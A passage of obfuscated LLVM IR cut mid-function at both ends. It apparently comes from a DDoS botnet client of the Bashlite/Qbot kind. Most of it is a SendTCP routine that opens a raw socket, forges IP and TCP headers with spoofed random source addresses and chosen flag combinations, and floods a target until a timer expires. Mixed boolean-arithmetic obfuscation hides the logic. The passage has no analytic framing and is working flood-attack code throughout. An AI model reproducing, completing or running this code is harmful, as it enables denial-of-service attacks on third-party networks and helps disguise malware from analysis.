; <label>:231:                                    ; preds = %204
  %232 = call i64 @time(i64* null) #5
  %233 = load i32, i32* %22, align 4
  %234 = sext i32 %233 to i64
  %235 = icmp sgt i64 %232, %234
  br i1 %235, label %236, label %237

; <label>:236:                                    ; preds = %231
  br label %244

; <label>:237:                                    ; preds = %231
  store i32 0, i32* %23, align 4
  br label %184

; <label>:238:                                    ; preds = %204
  %239 = load i32, i32* %23, align 4
  %240 = add i32 %239, 440169206
  %241 = add i32 %240, 1
  %242 = sub i32 %241, 440169206
  %243 = add i32 %239, 1
  store i32 %242, i32* %23, align 4
  br label %184

; <label>:244:                                    ; preds = %236
  %245 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %245)
  br label %246

; <label>:246:                                    ; preds = %244, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %638

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %638

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %638

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %78

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub i32 32, -401204733
  %65 = sub i32 %64, %63
  %66 = add i32 %65, -401204733
  %67 = sub nsw i32 32, %63
  %68 = shl i32 1, %66
  %69 = sub i32 0, 1
  %70 = add i32 %68, %69
  %71 = sub nsw i32 %68, 1
  %72 = xor i32 %70, -1
  %73 = and i32 -1, %72
  %74 = xor i32 -1, -1
  %75 = and i32 %70, %74
  %76 = or i32 %73, %75
  %77 = xor i32 %70, -1
  store i32 %76, i32* %19, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %61
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 0, 40
  %82 = sub i64 0, %80
  %83 = add i64 %81, %82
  %84 = sub i64 0, %83
  %85 = add i64 40, %80
  %86 = call i8* @llvm.stacksave()
  store i8* %86, i8** %20, align 8
  %87 = alloca i8, i64 %84, align 16
  %88 = bitcast i8* %87 to %struct.iphdr*
  store %struct.iphdr* %88, %struct.iphdr** %21, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %90 = bitcast %struct.iphdr* %89 to i8*
  %91 = getelementptr i8, i8* %90, i64 20
  %92 = bitcast i8* %91 to %struct.tcphdr*
  store %struct.tcphdr* %92, %struct.tcphdr** %22, align 8
  %93 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %95 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 4
  %97 = load i32, i32* %19, align 4
  %98 = call i32 @getRandomIP(i32 %97)
  %99 = call i32 @htonl(i32 %98) #10
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 20, -2811477484735356093
  %103 = add i64 %102, %101
  %104 = sub i64 %103, -2811477484735356093
  %105 = add i64 20, %101
  %106 = trunc i64 %104 to i32
  call void @makeIPPacket(%struct.iphdr* %93, i32 %96, i32 %99, i8 zeroext 6, i32 %106)
  %107 = call i32 @rand_cmwc()
  %108 = trunc i32 %107 to i16
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon* %110 to %struct.anon.0*
  %112 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %111, i32 0, i32 0
  store i16 %108, i16* %112, align 4
  %113 = call i32 @rand_cmwc()
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon* %115 to %struct.anon.0*
  %117 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %116, i32 0, i32 2
  store i32 %113, i32* %117, align 4
  %118 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %119 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %118, i32 0, i32 0
  %120 = bitcast %union.anon* %119 to %struct.anon.0*
  %121 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %120, i32 0, i32 3
  store i32 0, i32* %121, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = xor i16 -241, -1
  %128 = xor i16 %126, %127
  %129 = and i16 %128, %126
  %130 = and i16 %126, -241
  %131 = and i16 %129, 80
  %132 = xor i16 %129, 80
  %133 = or i16 %131, %132
  %134 = or i16 %129, 80
  store i16 %133, i16* %125, align 4
  %135 = load i8*, i8** %11, align 8
  %136 = call i32 @strcmp(i8* %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.152, i32 0, i32 0)) #9
  %137 = icmp ne i32 %136, 0
  br i1 %137, label %265, label %138

; <label>:138:                                    ; preds = %78
  %139 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i32 0, i32 0
  %141 = bitcast %union.anon* %140 to %struct.anon.0*
  %142 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %141, i32 0, i32 4
  %143 = load i16, i16* %142, align 4
  %144 = xor i16 %143, -1
  %145 = xor i16 -513, -1
  %146 = xor i16 -10486, -1
  %147 = or i16 %144, %145
  %148 = or i16 -10486, %146
  %149 = xor i16 %147, -1
  %150 = and i16 %149, %148
  %151 = and i16 %143, -513
  %152 = xor i16 %150, -1
  %153 = xor i16 512, -1
  %154 = xor i16 9833, -1
  %155 = and i16 %152, 9833
  %156 = and i16 %150, %154
  %157 = and i16 %153, 9833
  %158 = and i16 512, %154
  %159 = or i16 %155, %156
  %160 = or i16 %157, %158
  %161 = xor i16 %159, %160
  %162 = or i16 %152, %153
  %163 = xor i16 %162, -1
  %164 = or i16 9833, %154
  %165 = and i16 %163, %164
  %166 = or i16 %161, %165
  %167 = or i16 %150, 512
  store i16 %166, i16* %142, align 4
  %168 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i32 0, i32 0
  %170 = bitcast %union.anon* %169 to %struct.anon.0*
  %171 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %170, i32 0, i32 4
  %172 = load i16, i16* %171, align 4
  %173 = xor i16 %172, -1
  %174 = xor i16 -1025, -1
  %175 = xor i16 11401, -1
  %176 = or i16 %173, %174
  %177 = or i16 11401, %175
  %178 = xor i16 %176, -1
  %179 = and i16 %178, %177
  %180 = and i16 %172, -1025
  %181 = and i16 %179, 1024
  %182 = xor i16 %179, 1024
  %183 = or i16 %181, %182
  %184 = or i16 %179, 1024
  store i16 %183, i16* %171, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = xor i16 -257, -1
  %191 = xor i16 %189, %190
  %192 = and i16 %191, %189
  %193 = and i16 %189, -257
  %194 = xor i16 %192, -1
  %195 = xor i16 256, -1
  %196 = xor i16 9894, -1
  %197 = and i16 %194, 9894
  %198 = and i16 %192, %196
  %199 = and i16 %195, 9894
  %200 = and i16 256, %196
  %201 = or i16 %197, %198
  %202 = or i16 %199, %200
  %203 = xor i16 %201, %202
  %204 = or i16 %194, %195
  %205 = xor i16 %204, -1
  %206 = or i16 9894, %196
  %207 = and i16 %205, %206
  %208 = or i16 %203, %207
  %209 = or i16 %192, 256
  store i16 %208, i16* %188, align 4
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon* %211 to %struct.anon.0*
  %213 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = xor i16 -4097, -1
  %216 = xor i16 %214, %215
  %217 = and i16 %216, %214
  %218 = and i16 %214, -4097
  %219 = and i16 %217, 4096
  %220 = xor i16 %217, 4096
  %221 = or i16 %219, %220
  %222 = or i16 %217, 4096
  store i16 %221, i16* %213, align 4
  %223 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon* %224 to %struct.anon.0*
  %226 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 -2049, -1
  %229 = xor i16 %227, %228
  %230 = and i16 %229, %227
  %231 = and i16 %227, -2049
  %232 = xor i16 %230, -1
  %233 = xor i16 2048, -1
  %234 = xor i16 16710, -1
  %235 = and i16 %232, 16710
  %236 = and i16 %230, %234
  %237 = and i16 %233, 16710
  %238 = and i16 2048, %234
  %239 = or i16 %235, %236
  %240 = or i16 %237, %238
  %241 = xor i16 %239, %240
  %242 = or i16 %232, %233
  %243 = xor i16 %242, -1
  %244 = or i16 16710, %234
  %245 = and i16 %243, %244
  %246 = or i16 %241, %245
  %247 = or i16 %230, 2048
  store i16 %246, i16* %226, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = xor i16 %252, -1
  %254 = xor i16 -8193, -1
  %255 = xor i16 -26477, -1
  %256 = or i16 %253, %254
  %257 = or i16 -26477, %255
  %258 = xor i16 %256, -1
  %259 = and i16 %258, %257
  %260 = and i16 %252, -8193
  %261 = and i16 %259, 8192
  %262 = xor i16 %259, 8192
  %263 = or i16 %261, %262
  %264 = or i16 %259, 8192
  store i16 %263, i16* %251, align 4
  br label %265

; <label>:265:                                    ; preds = %138, %78
  %266 = load i8*, i8** %11, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0)) #9
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %320, label %269

; <label>:269:                                    ; preds = %265
  %270 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon* %271 to %struct.anon.0*
  %273 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = xor i16 -513, -1
  %276 = xor i16 %274, %275
  %277 = and i16 %276, %274
  %278 = and i16 %274, -513
  %279 = xor i16 %277, -1
  %280 = xor i16 512, -1
  %281 = xor i16 -13038, -1
  %282 = and i16 %279, -13038
  %283 = and i16 %277, %281
  %284 = and i16 %280, -13038
  %285 = and i16 512, %281
  %286 = or i16 %282, %283
  %287 = or i16 %284, %285
  %288 = xor i16 %286, %287
  %289 = or i16 %279, %280
  %290 = xor i16 %289, -1
  %291 = or i16 -13038, %281
  %292 = and i16 %290, %291
  %293 = or i16 %288, %292
  %294 = or i16 %277, 512
  store i16 %293, i16* %273, align 4
  %295 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon* %296 to %struct.anon.0*
  %298 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = xor i16 -8193, -1
  %301 = xor i16 %299, %300
  %302 = and i16 %301, %299
  %303 = and i16 %299, -8193
  %304 = xor i16 %302, -1
  %305 = xor i16 8192, -1
  %306 = xor i16 15988, -1
  %307 = and i16 %304, 15988
  %308 = and i16 %302, %306
  %309 = and i16 %305, 15988
  %310 = and i16 8192, %306
  %311 = or i16 %307, %308
  %312 = or i16 %309, %310
  %313 = xor i16 %311, %312
  %314 = or i16 %304, %305
  %315 = xor i16 %314, -1
  %316 = or i16 15988, %306
  %317 = and i16 %315, %316
  %318 = or i16 %313, %317
  %319 = or i16 %302, 8192
  store i16 %318, i16* %298, align 4
  br label %320

; <label>:320:                                    ; preds = %269, %265
  %321 = load i8*, i8** %11, align 8
  %322 = call i32 @strcmp(i8* %321, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i32 0, i32 0)) #9
  %323 = icmp ne i32 %322, 0
  br i1 %323, label %355, label %324

; <label>:324:                                    ; preds = %320
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 0
  %327 = bitcast %union.anon* %326 to %struct.anon.0*
  %328 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %327, i32 0, i32 4
  %329 = load i16, i16* %328, align 4
  %330 = xor i16 %329, -1
  %331 = xor i16 -513, -1
  %332 = xor i16 22525, -1
  %333 = or i16 %330, %331
  %334 = or i16 22525, %332
  %335 = xor i16 %333, -1
  %336 = and i16 %335, %334
  %337 = and i16 %329, -513
  %338 = and i16 %336, 512
  %339 = xor i16 %336, 512
  %340 = or i16 %338, %339
  %341 = or i16 %336, 512
  store i16 %340, i16* %328, align 4
  %342 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon* %343 to %struct.anon.0*
  %345 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = xor i16 -4097, -1
  %348 = xor i16 %346, %347
  %349 = and i16 %348, %346
  %350 = and i16 %346, -4097
  %351 = and i16 %349, 4096
  %352 = xor i16 %349, 4096
  %353 = or i16 %351, %352
  %354 = or i16 %349, 4096
  store i16 %353, i16* %345, align 4
  br label %522

; <label>:355:                                    ; preds = %320
  %356 = load i8*, i8** %11, align 8
  %357 = call i8* @strtok(i8* %356, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0)) #5
  store i8* %357, i8** %23, align 8
  br label %358

; <label>:358:                                    ; preds = %519, %355
  %359 = load i8*, i8** %23, align 8
  %360 = icmp ne i8* %359, null
  br i1 %360, label %361, label %521

; <label>:361:                                    ; preds = %358
  %362 = load i8*, i8** %23, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %391, label %365

; <label>:365:                                    ; preds = %361
  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon* %367 to %struct.anon.0*
  %369 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = xor i16 -513, -1
  %372 = xor i16 %370, %371
  %373 = and i16 %372, %370
  %374 = and i16 %370, -513
  %375 = xor i16 %373, -1
  %376 = xor i16 512, -1
  %377 = xor i16 16240, -1
  %378 = and i16 %375, 16240
  %379 = and i16 %373, %377
  %380 = and i16 %376, 16240
  %381 = and i16 512, %377
  %382 = or i16 %378, %379
  %383 = or i16 %380, %381
  %384 = xor i16 %382, %383
  %385 = or i16 %375, %376
  %386 = xor i16 %385, -1
  %387 = or i16 16240, %377
  %388 = and i16 %386, %387
  %389 = or i16 %384, %388
  %390 = or i16 %373, 512
  store i16 %389, i16* %369, align 4
  br label %519

; <label>:391:                                    ; preds = %361
  %392 = load i8*, i8** %23, align 8
  %393 = call i32 @strcmp(i8* %392, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.157, i32 0, i32 0)) #9
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %425, label %395

; <label>:395:                                    ; preds = %391
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon* %397 to %struct.anon.0*
  %399 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %398, i32 0, i32 4
  %400 = load i16, i16* %399, align 4
  %401 = xor i16 %400, -1
  %402 = xor i16 -1025, -1
  %403 = xor i16 26504, -1
  %404 = or i16 %401, %402
  %405 = or i16 26504, %403
  %406 = xor i16 %404, -1
  %407 = and i16 %406, %405
  %408 = and i16 %400, -1025
  %409 = xor i16 %407, -1
  %410 = xor i16 1024, -1
  %411 = xor i16 -25258, -1
  %412 = and i16 %409, -25258
  %413 = and i16 %407, %411
  %414 = and i16 %410, -25258
  %415 = and i16 1024, %411
  %416 = or i16 %412, %413
  %417 = or i16 %414, %415
  %418 = xor i16 %416, %417
  %419 = or i16 %409, %410
  %420 = xor i16 %419, -1
  %421 = or i16 -25258, %411
  %422 = and i16 %420, %421
  %423 = or i16 %418, %422
  %424 = or i16 %407, 1024
  store i16 %423, i16* %399, align 4
  br label %518

; <label>:425:                                    ; preds = %391
  %426 = load i8*, i8** %23, align 8
  %427 = call i32 @strcmp(i8* %426, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.158, i32 0, i32 0)) #9
  %428 = icmp ne i32 %427, 0
  br i1 %428, label %443, label %429

; <label>:429:                                    ; preds = %425
  %430 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i32 0, i32 0
  %432 = bitcast %union.anon* %431 to %struct.anon.0*
  %433 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %432, i32 0, i32 4
  %434 = load i16, i16* %433, align 4
  %435 = xor i16 -257, -1
  %436 = xor i16 %434, %435
  %437 = and i16 %436, %434
  %438 = and i16 %434, -257
  %439 = and i16 %437, 256
  %440 = xor i16 %437, 256
  %441 = or i16 %439, %440
  %442 = or i16 %437, 256
  store i16 %441, i16* %433, align 4
  br label %517

; <label>:443:                                    ; preds = %425
  %444 = load i8*, i8** %23, align 8
  %445 = call i32 @strcmp(i8* %444, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %446 = icmp ne i32 %445, 0
  br i1 %446, label %461, label %447

; <label>:447:                                    ; preds = %443
  %448 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  %450 = bitcast %union.anon* %449 to %struct.anon.0*
  %451 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %450, i32 0, i32 4
  %452 = load i16, i16* %451, align 4
  %453 = xor i16 -4097, -1
  %454 = xor i16 %452, %453
  %455 = and i16 %454, %452
  %456 = and i16 %452, -4097
  %457 = and i16 %455, 4096
  %458 = xor i16 %455, 4096
  %459 = or i16 %457, %458
  %460 = or i16 %455, 4096
  store i16 %459, i16* %451, align 4
  br label %516

; <label>:461:                                    ; preds = %443
  %462 = load i8*, i8** %23, align 8
  %463 = call i32 @strcmp(i8* %462, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #9
  %464 = icmp ne i32 %463, 0
  br i1 %464, label %479, label %465

; <label>:465:                                    ; preds = %461
  %466 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon* %467 to %struct.anon.0*
  %469 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %468, i32 0, i32 4
  %470 = load i16, i16* %469, align 4
  %471 = xor i16 -2049, -1
  %472 = xor i16 %470, %471
  %473 = and i16 %472, %470
  %474 = and i16 %470, -2049
  %475 = and i16 %473, 2048
  %476 = xor i16 %473, 2048
  %477 = or i16 %475, %476
  %478 = or i16 %473, 2048
  store i16 %477, i16* %469, align 4
  br label %515

; <label>:479:                                    ; preds = %461
  %480 = load i8*, i8** %23, align 8
  %481 = call i32 @strcmp(i8* %480, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.161, i32 0, i32 0)) #9
  %482 = icmp ne i32 %481, 0
  br i1 %482, label %513, label %483

; <label>:483:                                    ; preds = %479
  %484 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %485 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %484, i32 0, i32 0
  %486 = bitcast %union.anon* %485 to %struct.anon.0*
  %487 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %486, i32 0, i32 4
  %488 = load i16, i16* %487, align 4
  %489 = xor i16 %488, -1
  %490 = xor i16 -8193, -1
  %491 = xor i16 26657, -1
  %492 = or i16 %489, %490
  %493 = or i16 26657, %491
  %494 = xor i16 %492, -1
  %495 = and i16 %494, %493
  %496 = and i16 %488, -8193
  %497 = xor i16 %495, -1
  %498 = xor i16 8192, -1
  %499 = xor i16 21966, -1
  %500 = and i16 %497, 21966
  %501 = and i16 %495, %499
  %502 = and i16 %498, 21966
  %503 = and i16 8192, %499
  %504 = or i16 %500, %501
  %505 = or i16 %502, %503
  %506 = xor i16 %504, %505
  %507 = or i16 %497, %498
  %508 = xor i16 %507, -1
  %509 = or i16 21966, %499
  %510 = and i16 %508, %509
  %511 = or i16 %506, %510
  %512 = or i16 %495, 8192
  store i16 %511, i16* %487, align 4
  br label %514

; <label>:513:                                    ; preds = %479
  br label %514

; <label>:514:                                    ; preds = %513, %483
  br label %515

; <label>:515:                                    ; preds = %514, %465
  br label %516

; <label>:516:                                    ; preds = %515, %447
  br label %517

; <label>:517:                                    ; preds = %516, %429
  br label %518

; <label>:518:                                    ; preds = %517, %395
  br label %519

; <label>:519:                                    ; preds = %518, %365
  %520 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %520, i8** %23, align 8
  br label %358

; <label>:521:                                    ; preds = %358
  br label %522

; <label>:522:                                    ; preds = %521, %324
  %523 = call i32 @rand_cmwc()
  %524 = trunc i32 %523 to i16
  %525 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %526 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %525, i32 0, i32 0
  %527 = bitcast %union.anon* %526 to %struct.anon.0*
  %528 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %527, i32 0, i32 5
  store i16 %524, i16* %528, align 2
  %529 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 0
  %531 = bitcast %union.anon* %530 to %struct.anon.0*
  %532 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %531, i32 0, i32 6
  store i16 0, i16* %532, align 4
  %533 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %534 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %533, i32 0, i32 0
  %535 = bitcast %union.anon* %534 to %struct.anon.0*
  %536 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %535, i32 0, i32 7
  store i16 0, i16* %536, align 2
  %537 = load i32, i32* %9, align 4
  %538 = icmp eq i32 %537, 0
  br i1 %538, label %539, label %541

; <label>:539:                                    ; preds = %522
  %540 = call i32 @rand_cmwc()
  br label %546

; <label>:541:                                    ; preds = %522
  %542 = load i32, i32* %9, align 4
  %543 = trunc i32 %542 to i16
  %544 = call zeroext i16 @htons(i16 zeroext %543) #10
  %545 = zext i16 %544 to i32
  br label %546

; <label>:546:                                    ; preds = %541, %539
  %547 = phi i32 [ %540, %539 ], [ %545, %541 ]
  %548 = trunc i32 %547 to i16
  %549 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 0
  %551 = bitcast %union.anon* %550 to %struct.anon.0*
  %552 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %551, i32 0, i32 1
  store i16 %548, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %554 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %555 = call zeroext i16 @tcpcsum(%struct.iphdr* %553, %struct.tcphdr* %554)
  %556 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 0
  %558 = bitcast %union.anon* %557 to %struct.anon.0*
  %559 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %558, i32 0, i32 6
  store i16 %555, i16* %559, align 4
  %560 = bitcast i8* %87 to i16*
  %561 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 2
  %563 = load i16, i16* %562, align 2
  %564 = zext i16 %563 to i32
  %565 = call zeroext i16 @csum(i16* %560, i32 %564)
  %566 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %567 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %566, i32 0, i32 7
  store i16 %565, i16* %567, align 2
  %568 = call i64 @time(i64* null) #5
  %569 = load i32, i32* %10, align 4
  %570 = sext i32 %569 to i64
  %571 = sub i64 %568, -1905696175651037388
  %572 = add i64 %571, %570
  %573 = add i64 %572, -1905696175651037388
  %574 = add nsw i64 %568, %570
  %575 = trunc i64 %573 to i32
  store i32 %575, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %576

; <label>:576:                                    ; preds = %630, %629, %546
  br label %577

; <label>:577:                                    ; preds = %576
  %578 = load i32, i32* %17, align 4
